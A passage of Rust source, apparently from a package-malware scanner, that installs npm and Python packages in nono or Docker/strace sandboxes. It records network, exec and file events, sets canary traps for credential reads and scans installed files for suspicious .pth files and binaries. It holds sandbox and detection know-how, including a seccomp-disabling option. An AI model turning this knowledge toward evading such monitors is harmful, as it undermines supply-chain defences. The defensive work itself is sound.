        let target_path = work_dir.to_string_lossy().to_string();
        let home_path = home_dir.to_string_lossy().to_string();

        let base_state = match std::env::var("XDG_STATE_HOME") {
            Ok(s) => std::path::PathBuf::from(s),
            Err(_) => {
                if let Ok(home) = std::env::var("HOME") {
                    std::path::PathBuf::from(home).join(".local/state")
                } else {
                    temp_dir.path().to_path_buf()
                }
            }
        };
        let state_root = base_state.join("gyrseek_nono");
        let _ = std::fs::create_dir_all(&state_root);
        let state_temp_dir = tempfile::Builder::new()
            .prefix("run_")
            .tempdir_in(&state_root)
            .map_err(|e| format!("failed to create temp nono state dir: {e}"))?;
        let state_path = state_temp_dir.path();

        let (cmd_bin, cmd_args) = if is_npm_family_manager(manager) {
            let mut args = vec![
                npm_family_install_subcommand(manager).to_string(),
                format!("{}@{}", package, version),
                npm_family_install_dir_flag(manager).to_string(),
                target_path.clone(),
            ];
            if manager == "pnpm" {
                args.push("--lockfile=false".to_string());
                args.push("--config.node-linker=hoisted".to_string());
            } else {
                args.push("--no-save".to_string());
            }
            (manager.to_string(), args)
        } else if manager == "pip" || manager == "pip3" {
            (
                manager.to_string(),
                vec![
                    "install".to_string(),
                    format!("{}=={}", package, version),
                    "--target".to_string(),
                    target_path.clone(),
                    "--no-cache".to_string(),
                ],
            )
        } else if manager == "uv" {
            (
                "uv".to_string(),
                vec![
                    "pip".to_string(),
                    "install".to_string(),
                    format!("{}=={}", package, version),
                    "--target".to_string(),
                    target_path.clone(),
                    "--no-cache".to_string(),
                ],
            )
        } else {
            let uv_available = Command::new("uv")
                .arg("--version")
                .stdout(Stdio::null())
                .stderr(Stdio::null())
                .status()
                .map(|s| s.success())
                .unwrap_or(false);

            let bin = if uv_available {
                "uv"
            } else if Command::new("pip3")
                .arg("--version")
                .stdout(Stdio::null())
                .stderr(Stdio::null())
                .status()
                .map(|s| s.success())
                .unwrap_or(false)
            {
                "pip3"
            } else {
                "pip"
            };

            let args = if bin == "uv" {
                vec![
                    "pip".to_string(),
                    "install".to_string(),
                    format!("{}=={}", package, version),
                    "--target".to_string(),
                    target_path.clone(),
                    "--no-cache".to_string(),
                ]
            } else {
                vec![
                    "install".to_string(),
                    format!("{}=={}", package, version),
                    "--target".to_string(),
                    target_path.clone(),
                    "--no-cache".to_string(),
                ]
            };
            (bin.to_string(), args)
        };

        let path_shims = PathShims::setup(temp_dir.path(), state_path)
            .map_err(|e| format!("failed to setup path shims: {e}"))?;

        let canary_trap = CanaryTrap::setup(&work_dir, &home_dir, manager)
            .map_err(|e| format!("failed to setup canary trap: {e}"))?;

        let host_path = std::env::var("PATH").unwrap_or_default();
        let shimmed_path = if host_path.is_empty() {
            path_shims.shims_dir().to_string_lossy().to_string()
        } else {
            format!("{}:{}", path_shims.shims_dir().display(), host_path)
        };

        let nono_bin = resolve_nono_bin();
        let mut nono_cmd = Command::new(&nono_bin);
        nono_cmd.current_dir(&work_dir);
        nono_cmd.args([
            "run",
            "--no-rollback-prompt",
            "--diagnostics-json",
            "--silent",
            "--allow",
            &allow_path,
            "--write-file",
            &path_shims.fifo_path().to_string_lossy(),
        ]);

        let cache_dir = darwin_user_cache_dir();
        if let Some(profile_content) =
            nono_profile_content_for_os(std::env::consts::OS, cache_dir.as_deref())
        {
            let profile_path = temp_dir.path().join("gyrseek_profile.json");
            std::fs::write(&profile_path, profile_content)
                .map_err(|e| format!("failed to write nono profile: {e}"))?;
            nono_cmd.args(["-p", &profile_path.to_string_lossy()]);
        }

        let resource_args = nono_resource_limit_args();
        nono_cmd.args(&resource_args);

        if let Some(extra_domains) = domain_constraint {
            let mut allowed_domains = default_allowed_domains_for_manager(manager);
            allowed_domains.extend(discover_registry_domains_from_env());
            allowed_domains.extend(extra_domains.iter().cloned());
            allowed_domains.retain(|d| !d.trim().is_empty());
            allowed_domains.sort();
            allowed_domains.dedup();

            for domain in &allowed_domains {
                nono_cmd.args(["--allow-domain", domain]);
            }
        } else {
            // Unconstrained baseline probe: enable proxy for all domains to discover legitimate dependencies
            nono_cmd.args(["--allow-domain", "*"]);
        }

        if let Some(bin_path) = find_in_path(&cmd_bin) {
            if let Some(parent) = bin_path.parent() {
                nono_cmd.args(["--read", &parent.to_string_lossy()]);
            }
            if let Ok(canonical) = std::fs::canonicalize(&bin_path)
                && let Some(parent) = canonical.parent()
            {
                nono_cmd.args(["--read", &parent.to_string_lossy()]);
            }
            if let Ok(content) = std::fs::read_to_string(&bin_path)
                && let Some(first_line) = content.lines().next()
                && let Some(interpreter) = first_line.strip_prefix("#!")
            {
                let interp_cmd = interpreter.split_whitespace().next().unwrap_or("");
                let interp_path = std::path::Path::new(interp_cmd);
                if let Some(parent) = interp_path.parent() {
                    nono_cmd.args(["--read", &parent.to_string_lossy()]);
                }
                if let Ok(canonical) = std::fs::canonicalize(interp_path)
                    && let Some(parent) = canonical.parent()
                {
                    nono_cmd.args(["--read", &parent.to_string_lossy()]);
                }
            }
        }

        if let Ok(home) = std::env::var("HOME") {
            let p_home = std::path::Path::new(&home);
            for sub in [
                ".local/share/uv",
                ".local/share/pypoetry",
                ".local/share/pipx",
                ".local/share/pnpm",
                ".local/bin",
                ".cargo/bin",
            ] {
                let p = p_home.join(sub);
                if p.is_dir() {
                    nono_cmd.args(["--read", &p.to_string_lossy()]);
                }
            }
        }

        nono_cmd.arg("--");
        nono_cmd.arg("env");
        nono_cmd.arg(format!("PATH={}", shimmed_path));
        nono_cmd.arg(format!("HOME={}", target_path));
        nono_cmd.arg(format!("TMPDIR={}", home_path));
        nono_cmd.arg(format!("XDG_CACHE_HOME={}/cache", target_path));
        nono_cmd.arg(format!("XDG_CONFIG_HOME={}/config", target_path));
        nono_cmd.arg(format!("XDG_DATA_HOME={}/data", target_path));
        nono_cmd.arg(format!("NPM_CONFIG_CACHE={}/npm_cache", target_path));
        nono_cmd.arg(format!("UV_CACHE_DIR={}/uv_cache", target_path));
        nono_cmd.arg(format!("PNPM_HOME={}/pnpm_home", target_path));
        nono_cmd.arg(&cmd_bin);
        nono_cmd.args(&cmd_args);

        nono_cmd.env_clear();
        nono_cmd.env("PATH", &shimmed_path);
        if let Ok(home) = std::env::var("HOME") {
            nono_cmd.env("HOME", home);
        }
        nono_cmd.env("XDG_STATE_HOME", state_path);

        let output = nono_cmd
            .stdout(Stdio::piped())
            .stderr(Stdio::piped())
            .output()
            .map_err(|e| format!("failed to execute nono: {e}"))?;

        let canary_reads = canary_trap.teardown();
        let exec_events = path_shims.read_exec_events();
        let diagnostic_denials = parse_nono_diagnostics_denials(&output.stderr);

        let audit_dir = state_path.join("nono").join("audit");
        let mut audit_content = String::new();
        if let Ok(entries) = std::fs::read_dir(&audit_dir) {
            for entry in entries.flatten() {
                if entry.path().is_dir() {
                    let candidate = entry.path().join("audit-events.ndjson");
                    if candidate.exists()
                        && let Ok(content) = std::fs::read_to_string(&candidate)
                    {
                        audit_content = content;
                        break;
                    }
                }
            }
        }

        if audit_content.trim().is_empty() {
            return Err(format!(
                "empty audit log for '{}@{}': nono produced no audit output. Exit code: {:?}, Stderr: {}",
                package,
                version,
                output.status.code(),
                String::from_utf8_lossy(&output.stderr).trim()
            ));
        }

        let observed_domains = extract_domains_from_nono_audit_log(&audit_content);

        let mut trace = parse_nono_audit_log(&audit_content).replace(&target_path, "/work");
        if trace.trim().is_empty() {
            return Err(format!(
                "empty trace for '{}@{}': parsed trace contained no events. Stderr: {}",
                package,
                version,
                String::from_utf8_lossy(&output.stderr).trim()
            ));
        }

        for path in &canary_reads {
            trace.push_str(&format!(
                "openat(AT_FDCWD, \"{}\", O_RDONLY) = 3\n",
                escape_strace_synthetic(path)
            ));
        }
        for path in &diagnostic_denials {
            trace.push_str(&format!(
                "openat(AT_FDCWD, \"{}\", O_RDONLY) = -1 EACCES (Permission denied)\n",
                escape_strace_synthetic(path)
            ));
        }
        for (exe, args) in &exec_events {
            let mut full_argv = vec![exe.clone()];
            full_argv.extend(args.iter().cloned());
            let quoted: Vec<String> = full_argv
                .iter()
                .map(|a| format!("\"{}\"", escape_strace_synthetic(a)))
                .collect();
            trace.push_str(&format!(
                "execve(\"/usr/bin/{}\", [{}], 0x7ffd00000000) = 0\n",
                escape_strace_synthetic(exe),
                quoted.join(", ")
            ));
        }

        let artifact_lines = scan_target_artifacts(&work_dir);
        if !artifact_lines.is_empty() {
            trace.push_str("\n=== gyrseek_artifacts ===\n");
            trace.push_str(&artifact_lines);
        }

        Ok((trace, observed_domains))
    }
}

impl SandboxRunner for NonoRunner {
    fn trace_install(&self, manager: &str, package: &str, version: &str) -> Result<String, String> {
        let (trace, _) = self.trace_install_with_domains(manager, package, version, Some(&[]))?;
        Ok(trace)
    }

    fn trace_install_matrix(
        &self,
        manager: &str,
        probes: &[(String, String)],
    ) -> Result<Vec<ProbeTrace>, String> {
        if probes.is_empty() {
            return Ok(Vec::new());
        }

        let mut package_groups: HashMap<String, Vec<(String, String)>> = HashMap::new();
        let mut package_order = Vec::new();
        for (pkg, ver) in probes {
            if !package_groups.contains_key(pkg) {
                package_order.push(pkg.clone());
            }
            package_groups
                .entry(pkg.clone())
                .or_default()
                .push((pkg.clone(), ver.clone()));
        }

        let mut results_map: HashMap<(String, String), String> = HashMap::new();

        for pkg in package_order {
            let pkg_probes = package_groups.remove(&pkg).unwrap_or_default();
            if pkg_probes.is_empty() {
                continue;
            }

            let candidate = &pkg_probes[0];
            let baselines = &pkg_probes[1..];

            // 1. Run baseline probes unconstrained to discover legitimate endpoints used by known-good versions.
            let mut baseline_domains = Vec::new();
            for (b_pkg, b_ver) in baselines {
                let (trace, domains) =
                    self.trace_install_with_domains(manager, b_pkg, b_ver, None)?;
                baseline_domains.extend(domains);
                results_map.insert((b_pkg.clone(), b_ver.clone()), trace);
            }
            baseline_domains.sort();
            baseline_domains.dedup();

            // 2. Run candidate probe strictly constrained to registry domains + discovered baseline domains.
            let (cand_trace, _) = self.trace_install_with_domains(
                manager,
                &candidate.0,
                &candidate.1,
                Some(&baseline_domains),
            )?;
            results_map.insert((candidate.0.clone(), candidate.1.clone()), cand_trace);
        }

        let mut ordered_results = Vec::new();
        for probe in probes {
            let trace = results_map
                .get(probe)
                .cloned()
                .ok_or_else(|| format!("missing trace for probe {:?}", probe))?;
            ordered_results.push((probe.clone(), trace));
        }

        Ok(ordered_results)
    }
}

pub(crate) fn scan_target_artifacts(target_dir: &Path) -> String {
    let mut lines = Vec::new();
    let mut dirs_to_visit = vec![target_dir.to_path_buf()];

    while let Some(current_dir) = dirs_to_visit.pop() {
        let entries = match std::fs::read_dir(&current_dir) {
            Ok(e) => e,
            Err(_) => continue,
        };

        for entry in entries.flatten() {
            let path = entry.path();
            let metadata = match std::fs::symlink_metadata(&path) {
                Ok(m) => m,
                Err(_) => continue,
            };

            if metadata.file_type().is_symlink() {
                continue;
            }

            if metadata.is_dir() {
                dirs_to_visit.push(path);
            } else if metadata.is_file() {
                let size = metadata.len();
                let rel = path.strip_prefix(target_dir).unwrap_or(&path);
                let virt_path = format!("/work/{}", rel.to_string_lossy());

                let mut f = match std::fs::File::open(&path) {
                    Ok(f) => f,
                    Err(_) => continue,
                };
                let mut buf = [0u8; 300];
                let bytes_read = f.read(&mut buf).unwrap_or(0);
                let slice = &buf[..bytes_read];

                let file_type = if slice.starts_with(b"\x7fELF") {
                    "ELF 64-bit LSB executable"
                } else if slice.starts_with(b"\xfe\xed\xfa\xce")
                    || slice.starts_with(b"\xfe\xed\xfa\xcf")
                    || slice.starts_with(b"\xce\xfa\xed\xfe")
                    || slice.starts_with(b"\xcf\xfa\xed\xfe")
                    || slice.starts_with(b"\xca\xfe\xba\xbe")
                    || slice.starts_with(b"\xbe\xba\xfe\xca")
                    || slice.starts_with(b"\xca\xfe\xba\xbf")
                    || slice.starts_with(b"\xbf\xba\xfe\xca")
                {
                    "Mach-O 64-bit arm64 executable"
                } else if slice.starts_with(b"MZ") {
                    "PE32 executable"
                } else if path.extension().and_then(|s| s.to_str()) == Some("pth") {
                    "Python script text"
                } else {
                    "ASCII text"
                };

                let content_str =
                    String::from_utf8_lossy(slice).replace(['\0', '|', '\n', '\r'], " ");
                lines.push(format!(
                    "{}\0{}\0{}\0{}",
                    virt_path, size, file_type, content_str
                ));
            }
        }
    }

    lines.sort();
    lines.join("\n")
}

pub(crate) fn build_synthetic_dns_response(domain: &str, ip: IpAddr) -> Vec<u8> {
    let mut packet = Vec::new();
    // Header (12 bytes): ID = 0x1234, Flags = 0x8180 (standard response, no error)
    packet.extend_from_slice(&[0x12, 0x34, 0x81, 0x80]);
    // QDCOUNT = 1, ANCOUNT = 1, NSCOUNT = 0, ARCOUNT = 0
    packet.extend_from_slice(&[0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00]);

    // Question section:
    let qname_offset = packet.len();
    for label in domain.split('.') {
        if label.is_empty() {
            continue;
        }
        packet.push(label.len() as u8);
        packet.extend_from_slice(label.as_bytes());
    }
    packet.push(0); // Root label null terminator

    let (qtype, rtype, rdlen, rdata) = match ip {
        IpAddr::V4(v4) => (1u16, 1u16, 4u16, v4.octets().to_vec()),
        IpAddr::V6(v6) => (28u16, 28u16, 16u16, v6.octets().to_vec()),
    };

    // QTYPE, QCLASS (IN = 1)
    packet.extend_from_slice(&qtype.to_be_bytes());
    packet.extend_from_slice(&[0x00, 0x01]);

    // Answer section:
    // NAME: compression pointer to qname
    let ptr = 0xc000 | (qname_offset as u16);
    packet.extend_from_slice(&ptr.to_be_bytes());
    // TYPE, CLASS
    packet.extend_from_slice(&rtype.to_be_bytes());
    packet.extend_from_slice(&[0x00, 0x01]);
    // TTL = 60s
    packet.extend_from_slice(&[0x00, 0x00, 0x00, 0x3c]);
    // RDLENGTH
    packet.extend_from_slice(&rdlen.to_be_bytes());
    // RDATA
    packet.extend_from_slice(&rdata);

    packet
}

pub(crate) fn format_synthetic_dns_trace_line(packet: &[u8]) -> String {
    let mut hex = String::with_capacity(packet.len() * 4);
    for b in packet {
        use std::fmt::Write;
        let _ = write!(hex, "\\x{:02x}", b);
    }
    format!(
        "recvfrom(4, \"{}\", {}, 0, {{sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr(\"8.8.8.8\")}}, 16) = {}\n",
        hex,
        packet.len(),
        packet.len()
    )
}

fn escape_strace_synthetic(s: &str) -> String {
    let mut out = String::with_capacity(s.len());
    for &b in s.as_bytes() {
        match b {
            b'\\' => out.push_str("\\x5c"),
            b'"' => out.push_str("\\x22"),
            b'[' => out.push_str("\\x5b"),
            b']' => out.push_str("\\x5d"),
            b',' => out.push_str("\\x2c"),
            0x20..=0x7e => out.push(b as char),
            _ => {
                use std::fmt::Write;
                let _ = write!(out, "\\x{:02x}", b);
            }
        }
    }
    out
}

fn synthetic_ip_for_domain(domain: &str) -> IpAddr {
    use std::hash::BuildHasher;

    static KEY: std::sync::OnceLock<std::collections::hash_map::RandomState> =
        std::sync::OnceLock::new();

    let hash = KEY
        .get_or_init(Default::default)
        .hash_one(domain.trim_end_matches('.').to_ascii_lowercase());

    let mut octets = [0u8; 16];
    octets[..4].copy_from_slice(&[0x20, 0x01, 0x0d, 0xb8]);
    octets[8..].copy_from_slice(&hash.to_be_bytes());
    IpAddr::V6(std::net::Ipv6Addr::from(octets))
}

pub(crate) fn parse_nono_audit_log(audit_jsonl: &str) -> String {
    let mut output = String::new();

    for line in audit_jsonl.lines() {
        let trimmed = line.trim();
        if trimmed.is_empty() {
            continue;
        }

        let Ok(val) = serde_json::from_str::<serde_json::Value>(trimmed) else {
            continue;
        };

        let event_obj = val.get("event");
        let event_type = event_obj
            .and_then(|e| e.get("type"))
            .and_then(|t| t.as_str())
            .or_else(|| val.get("type").and_then(|t| t.as_str()))
            .unwrap_or("");

        let payload = if let Some(e) = event_obj {
            if let Some(inner) = e.get("event") {
                inner
            } else {
                e
            }
        } else {
            &val
        };

        // 1. Network event
        let is_network = event_type == "network"
            || payload.get("target").is_some()
            || payload.get("host").is_some()
            || payload.get("ip").is_some();

        if is_network
            && let Some(target_val) = payload
                .get("target")
                .or_else(|| payload.get("host"))
                .or_else(|| payload.get("ip"))
                .and_then(|t| t.as_str())
        {
            let target = target_val.trim();
            if !target.is_empty() && !target.starts_with("unix:") {
                let port = payload.get("port").and_then(|p| p.as_u64()).unwrap_or(443) as u16;

                if let Ok(ip) = target.parse::<IpAddr>() {
                    match ip {
                        IpAddr::V4(v4) => {
                            output.push_str(&format!(
                                "connect(3, {{sa_family=AF_INET, sin_port=htons({}), sin_addr=inet_addr(\"{}\")}}, 16) = 0\n",
                                port, v4
                            ));
                        }
                        IpAddr::V6(v6) => {
                            output.push_str(&format!(
                                "connect(3, {{sa_family=AF_INET6, sin6_port=htons({}), sin6_addr=inet_pton(AF_INET6, \"{}\")}}, 28) = 0\n",
                                port, v6
                            ));
                        }
                    }
                } else {
                    let synthetic_ip = synthetic_ip_for_domain(target);

                    let dns_resp = build_synthetic_dns_response(target, synthetic_ip);
                    output.push_str(&format_synthetic_dns_trace_line(&dns_resp));
                    output.push_str(&format!(
                        "connect(3, {{sa_family=AF_INET6, sin6_port=htons({}), sin6_addr=inet_pton(AF_INET6, \"{}\")}}, 28) = 0\n",
                        port, synthetic_ip
                    ));
                }
            }
        }

        // 2. Command execution event
        let is_exec = event_type == "command_policy"
            || event_type == "exec"
            || event_type == "process"
            || payload.get("command").is_some()
            || payload.get("argv").is_some();

        if is_exec {
            let mut argv: Vec<String> = Vec::new();
            if let Some(arr) = payload.get("argv").and_then(|a| a.as_array()) {
                for item in arr {
                    if let Some(s) = item.as_str() {
                        argv.push(s.to_string());
                    }
                }
            } else if let Some(arr) = payload.get("command").and_then(|c| c.as_array()) {
                for item in arr {
                    if let Some(s) = item.as_str() {
                        argv.push(s.to_string());
                    }
                }
            } else if let Some(cmd_str) = payload.get("command").and_then(|c| c.as_str()) {
                argv = cmd_str.split_whitespace().map(|s| s.to_string()).collect();
            }

            if !argv.is_empty() {
                let exe = payload
                    .get("program")
                    .or_else(|| payload.get("path"))
                    .and_then(|p| p.as_str())
                    .unwrap_or(&argv[0]);

                if exe == "nono" || exe.ends_with("/nono") {
                    if let Some(pos) = argv.iter().position(|a| a == "--")
                        && pos + 1 < argv.len()
                    {
                        let inner_argv = &argv[pos + 1..];
                        let inner_exe = &inner_argv[0];
                        let quoted: Vec<String> = inner_argv
                            .iter()
                            .map(|a| format!("\"{}\"", escape_strace_synthetic(a)))
                            .collect();
                        output.push_str(&format!(
                            "execve(\"{}\", [{}], 0x7ffd00000000) = 0\n",
                            escape_strace_synthetic(inner_exe),
                            quoted.join(", ")
                        ));
                    }
                } else {
                    let quoted: Vec<String> = argv
                        .iter()
                        .map(|a| format!("\"{}\"", escape_strace_synthetic(a)))
                        .collect();
                    output.push_str(&format!(
                        "execve(\"{}\", [{}], 0x7ffd00000000) = 0\n",
                        escape_strace_synthetic(exe),
                        quoted.join(", ")
                    ));
                }
            }
        }

        // 3. File / sensitive access event
        let is_file = event_type == "file_access"
            || event_type == "capability_decision"
            || (!is_exec && payload.get("path").is_some());

        if is_file && let Some(path) = payload.get("path").and_then(|p| p.as_str()) {
            let trimmed_path = path.trim();
            if !trimmed_path.is_empty() {
                let is_denied = payload
                    .get("decision")
                    .and_then(|d| d.as_str())
                    .map(|d| d.eq_ignore_ascii_case("deny") || d.eq_ignore_ascii_case("block"))
                    .unwrap_or(false)
                    || payload
                        .get("allowed")
                        .and_then(|a| a.as_bool())
                        .map(|a| !a)
                        .unwrap_or(false)
                    || payload
                        .get("action")
                        .and_then(|a| a.as_str())
                        .map(|a| a.eq_ignore_ascii_case("deny") || a.eq_ignore_ascii_case("block"))
                        .unwrap_or(false)
                    || payload
                        .get("denied")
                        .and_then(|d| d.as_bool())
                        .unwrap_or(false);

                let ret_str = if is_denied {
                    "-1 EACCES (Permission denied)"
                } else {
                    "3"
                };
                output.push_str(&format!(
                    "openat(AT_FDCWD, \"{}\", O_RDONLY) = {}\n",
                    escape_strace_synthetic(trimmed_path),
                    ret_str
                ));
            }
        }
    }

    output
}

fn trace_install_docker_matrix_with_runtime(
    manager: &str,
    probes: &[(String, String)],
    runtime: Option<&str>,
    danger_disable_seccomp: bool,
) -> Result<Vec<ProbeTrace>, String> {
    if probes.is_empty() {
        return Ok(Vec::new());
    }

    let image_config = scanner_image_config(manager);

    let out_dir = tempfile::tempdir().map_err(|e| format!("failed to create temp dir: {e}"))?;
    let out_dir_path = out_dir.path().to_string_lossy().to_string();

    let script = build_matrix_script(manager, probes, image_config.prebuilt);
    let args = build_docker_run_args(
        &image_config.image,
        &out_dir_path,
        runtime,
        &script,
        danger_disable_seccomp,
    )?;

    let output = Command::new("docker")
        .args(&args)
        .stderr(Stdio::piped())
        .stdout(Stdio::piped())
        .output()
        .map_err(|e| format!("failed to execute docker sandbox: {e}"))?;

    if !output.status.success() {
        let stderr = String::from_utf8_lossy(&output.stderr);
        let stdout = String::from_utf8_lossy(&output.stdout);
        let mut tail_lines: Vec<_> = stdout.lines().rev().take(20).collect();
        tail_lines.reverse();
        let tail = tail_lines.join("\n");
        return Err(format!(
            "docker sandbox command failed (exit code: {}).\nstderr:\n{}\nstdout (last 20 lines):\n{}",
            output.status.code().unwrap_or(-1),
            stderr,
            tail,
        ));
    }

    let mut results = Vec::new();
    for (idx, (package, version)) in probes.iter().enumerate() {
        let trace_path = out_dir.path().join(format!("gyrseek_trace_{}.log", idx));
        // Prefer the matrix log; if it is missing/unreadable, retry the probe in
        // isolation. Either way, a blank trace means strace produced no data and
        // MUST NOT be treated as a clean zero-connection scan — fail closed.
        let mut trace = match std::fs::read_to_string(&trace_path) {
            Ok(contents) if !contents.trim().is_empty() => contents,
            _ => trace_install_docker_single_with_runtime(
                manager,
                package,
                version,
                runtime,
                danger_disable_seccomp,
            )?,
        };
        if trace.trim().is_empty() {
            let err_path = out_dir.path().join(format!("gyrseek_err_{}.log", idx));
            let strace_err = std::fs::read_to_string(&err_path).unwrap_or_default();
            return Err(format!(
                "empty trace for '{}@{}': strace produced no output (ptrace likely unavailable in this environment). strace stderr: {}",
                package,
                version,
                strace_err.trim()
            ));
        }
        // Append post-install artifact scan findings to the trace, separated by
        // a marker so the scanner can split them during signal extraction.
        let artifact_path = out_dir
            .path()
            .join(format!("gyrseek_artifacts_{}.log", idx));
        if let Ok(artifact_content) = std::fs::read_to_string(&artifact_path) {
            let trimmed = artifact_content.trim();
            if !trimmed.is_empty() {
                trace.push_str("\n=== gyrseek_artifacts ===\n");
                trace.push_str(trimmed);
            }
        }
        results.push(((package.clone(), version.clone()), trace));
    }

    Ok(results)
}

fn trace_install_docker_single_with_runtime(
    manager: &str,
    package: &str,
    version: &str,
    runtime: Option<&str>,
    danger_disable_seccomp: bool,
) -> Result<String, String> {
    let image_config = scanner_image_config(manager);
    let script = build_single_script(manager, package, version, image_config.prebuilt);
    // No /out bind mount here: the single-probe fallback captures strace output
    // from stderr rather than a log file.
    let args = build_docker_run_args(
        &image_config.image,
        "",
        runtime,
        &script,
        danger_disable_seccomp,
    )?;

    let output = Command::new("docker")
        .args(&args)
        .stderr(Stdio::piped())
        .stdout(Stdio::null())
        .output()
        .map_err(|e| format!("failed to execute docker sandbox: {e}"))?;

    if !output.status.success() {
        return Err(format!(
            "single-probe docker sandbox failed for '{}@{}': {}",
            package,
            version,
            String::from_utf8_lossy(&output.stderr)
        ));
    }

    Ok(String::from_utf8_lossy(&output.stderr).to_string())
}

/// Unprivileged in-container user the untrusted install payload runs as. The
/// container itself runs as root so strace can own the trace logs in /out, but
/// `strace -u` drops the *traced* process to this user — which has no write
/// access to the root-owned /out bind mount, so a malicious package can't
/// overwrite or delete its own trace.
const SCANNER_USER: &str = "gyrseek";

fn is_npm_family_manager(manager: &str) -> bool {
    manager == "npm" || manager == "pnpm"
}

fn npm_family_install_subcommand(manager: &str) -> &str {
    if manager == "pnpm" { "add" } else { "install" }
}

fn npm_family_install_dir_flag(manager: &str) -> &str {
    if manager == "pnpm" {
        "--dir"
    } else {
        "--prefix"
    }
}

/// The `pkg@version` (npm) / `pkg==version` (pip/uv) spec passed to the installer.
fn package_spec(manager: &str, package: &str, version: &str) -> String {
    if is_npm_family_manager(manager) {
        format!("{}@{}", package, version)
    } else {
        format!("{}=={}", package, version)
    }
}

/// Shell steps that create the unprivileged scanner user (idempotently, across
/// both Debian `useradd` and BusyBox `adduser`) and hand it ownership of /work.
fn scanner_user_setup_steps() -> Vec<String> {
    vec![
        format!(
            "id -u {u} >/dev/null 2>&1 || useradd -m -d /home/{u} -s /bin/sh {u} >/dev/null 2>&1 || adduser -D -h /home/{u} -s /bin/sh {u} >/dev/null 2>&1 || true",
            u = SCANNER_USER
        ),
        "mkdir -p /work".to_string(),
        format!(
            "chown -R {u} /work >/dev/null 2>&1 || true",
            u = SCANNER_USER
        ),
    ]
}

/// The actual `npm install` / `uv pip install` invocation, with HOME pinned to
/// the scanner-writable /work so the dropped-privilege user has a usable cache.
fn install_invocation(manager: &str, pkg_spec: &str) -> String {
    if manager == "pnpm" {
        format!(
            "env HOME=/work pnpm add {} --dir /work --lockfile=false",
            shell_single_quoted(pkg_spec)
        )
    } else if manager == "npm" {
        format!(
            "env HOME=/work npm install {} --prefix /work --no-save",
            shell_single_quoted(pkg_spec)
        )
    } else {
        format!(
            "env HOME=/work uv pip install {} --target /work --no-cache",
            shell_single_quoted(pkg_spec)
        )
    }
}

/// A single strace-wrapped install. `-s 4096 -v` stop strace truncating argv
/// strings (e.g. long git-clone URLs) and addresses to the 32-byte default;
/// `-xx` forces all bytes to hex-escape format (`\xNN`) for deterministic DNS
/// payload parsing; `-u` runs the payload unprivileged for trace integrity.
/// When `out_log` is set the trace is written there, otherwise it goes to
/// stderr.
fn strace_install_command(manager: &str, pkg_spec: &str, out_log: Option<&str>) -> String {
    let mut cmd = format!(
        "strace -f -s 4096 -v -xx -u {u} -e trace=network,execve,?execveat,open,openat,?openat2,?openat64,link,linkat,symlink,symlinkat,clone,?clone3,fork,vfork,dup,dup2,?dup3,fcntl",
        u = SCANNER_USER
    );
    if let Some(path) = out_log {
        cmd.push_str(&format!(" -o {}", path));
    }
    format!("{} {}", cmd, install_invocation(manager, pkg_spec))
}

/// Shared image-setup steps (install strace/ca-certs and, for Python, uv) used
/// when the scanner image is not prebuilt.
fn image_setup_steps(manager: &str, prebuilt: bool) -> Vec<String> {
    let mut steps = vec!["set -e".to_string()];
    if !prebuilt {
        steps.push(
            "env DEBIAN_FRONTEND=noninteractive apt-get -o APT::Sandbox::User=root update >&2"
                .to_string(),
        );
        steps.push(
            "env DEBIAN_FRONTEND=noninteractive apt-get -o APT::Sandbox::User=root install -y --no-install-recommends strace ca-certificates >&2"
                .to_string(),
        );
        if manager == "pnpm" {
            steps.push(
                "corepack enable pnpm >/dev/null 2>&1 || npm install -g pnpm >/dev/null"
                    .to_string(),
            );
        } else if manager != "npm" {
            steps.push("python -m pip install --quiet uv >/dev/null".to_string());
        }
    }
    steps
}

/// Shell commands that scan the installed file tree for class-specific IoCs:
/// `.pth` files with executable content (Hades/Miasma pattern), unexpected
/// runtime binaries (bun/deno), and other suspicious artifacts. The scan is
/// per-probe so faulty findings are attributed to a specific package-version.
fn build_artifact_scan_steps(idx: usize) -> Vec<String> {
    let out = format!("/out/gyrseek_artifacts_{}.log", idx);
    vec![
        // Initialize/clear the artifact log for this probe.
        format!("true > {}", out),
        // Single inventory pipeline: record path, size (bytes), file type, and
        // first 300 bytes of content for every installed file. Null byte (\0)
        // is used as the field delimiter because it cannot appear in POSIX
        // file paths, making delimiter-injection attacks impossible. Pipe
        // characters in content are still replaced with spaces as a defence-
        // in-depth measure.
        format!(
            "find /work -type f 2>/dev/null | while IFS= read -r f; do \
             size=$(stat -c%s \"$f\" 2>/dev/null || wc -c < \"$f\" 2>/dev/null); \
             type=$(file -b \"$f\" 2>/dev/null | head -c 100); \
             content=$(head -c 300 \"$f\" 2>/dev/null | tr '|' ' '); \
             printf '%s\\0%s\\0%s\\0%s\\n' \"$f\" \"$size\" \"$type\" \"$content\" >> {}; done || true",
            out
        ),
    ]
}

/// Builds the full `sh -lc` script for the matrix (multi-probe) run: per-probe
/// strace logs written to /out, payload dropped to the scanner user, followed
/// by a targeted artifact scan of the installed file tree.
fn build_matrix_script(manager: &str, probes: &[(String, String)], prebuilt: bool) -> String {
    let mut steps = image_setup_steps(manager, prebuilt);
    steps.extend(scanner_user_setup_steps());

    for (idx, (package, version)) in probes.iter().enumerate() {
        let spec = package_spec(manager, package, version);
        let log = format!("/out/gyrseek_trace_{}.log", idx);
        let err = format!("/out/gyrseek_err_{}.log", idx);
        // Drop the install's own stdout, but capture strace's stderr to a per-probe
        // file instead of discarding it with `>/dev/null 2>&1`. `|| true` keeps a
        // single failing install (e.g. a yanked baseline) from aborting sibling
        // probes; a genuine strace-attach failure leaves an empty trace log, which
        // the reader treats as a hard error (fail closed) using the captured stderr.
        steps.push(format!(
            "{} >/dev/null 2>{} || true",
            strace_install_command(manager, &spec, Some(&log)),
            err
        ));
        // After each install, scan the installed tree for suspicious artifacts.
        steps.extend(build_artifact_scan_steps(idx));
    }

    steps.join("; ")
}

/// Builds the `sh -lc` script for the single-probe fallback (trace to stderr).
fn build_single_script(manager: &str, package: &str, version: &str, prebuilt: bool) -> String {
    let mut steps = image_setup_steps(manager, prebuilt);
    steps.extend(scanner_user_setup_steps());

    let spec = package_spec(manager, package, version);
    steps.push(strace_install_command(manager, &spec, None));

    steps.join("; ")
}

/// Builds the `docker run` argument vector. When `out_dir_path` is non-empty it
/// is bind-mounted at /out (root-owned) to receive trace logs.
fn build_docker_run_args(
    image: &str,
    out_dir_path: &str,
    runtime: Option<&str>,
    script: &str,
    danger_disable_seccomp: bool,
) -> Result<Vec<String>, String> {
